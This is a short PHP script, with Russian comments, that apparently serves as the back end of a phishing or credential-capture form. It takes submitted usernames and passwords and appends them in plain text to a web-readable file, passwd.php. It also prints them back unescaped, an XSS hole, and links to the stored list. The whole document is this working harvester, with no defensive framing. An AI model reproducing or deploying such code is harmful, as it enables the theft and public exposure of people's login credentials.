<?php
 
$usrname= $_POST['username']; // Здесь будет значение инпута с name атрибутом "value"
$passwd =  $_POST['password']; // А здесь с name "email"

//$f = fopen('passwrd.php', 'a+'); // Открываем файл
//fwrite($f, "User-password: ".$usrname." - ".$passwd."\n"); // Записываем данные
//fclose($f); // Закрываем файл

$file = "passwd.php";
$nudata = "USER: ".$usrname." : ".$passwd."\n\n";
file_put_contents($file, $nudata, FILE_APPEND | LOCK_EX);
echo "User-password: ".$usrname." - ".$passwd."\n";
echo "<a href='passwd.php'>View</a>\n";
?>
